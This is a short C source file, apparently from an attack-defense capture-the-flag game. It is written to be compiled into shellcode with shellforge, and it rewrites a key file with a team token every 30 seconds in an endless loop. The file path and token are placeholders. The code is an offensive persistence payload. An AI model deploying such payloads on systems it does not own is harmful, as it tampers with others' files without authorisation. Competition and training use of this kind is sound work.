/*
 * To overwrite tokens forever
 *   by whats@wekk.net
 * 
 * IT WORKS WITH --cflags="-Os" in shellforge!
 *
 * To be used with shellforge (or gcc)
 * $ gcc -D GCC foreverOverwrite.c -o foreverOverwrite
 *
 */

#ifdef GCC
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/sem.h>
#include <stdio.h>
#include <sys/stat.h>
#include <fcntl.h>
#endif

// Tuneable params
//#define SECONDS_TO_WAIT 2
#define SECONDS_TO_WAIT 30
//#define FILE_PATH_TO_OPEN "/tmp/key"
#define FILE_PATH_TO_OPEN "AAAAAAAAAAAAAAAAAAAA"
#define TEAM_TOKEN "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"

#define writeKey(writeKey) \
	int fd = open(FILE_PATH_TO_OPEN, O_RDWR, 0); \
	write(fd, writeKey, 40); \
	close(fd);

int main()	{
    struct timespec ts;
    ts.tv_sec = SECONDS_TO_WAIT;
    ts.tv_nsec = 0;
	//write(1, "TOKENS RECOLLECTOR STARTED!\n", 28);
	while(1) {
		writeKey(TEAM_TOKEN);
		nanosleep(&ts, NULL);
	}
}
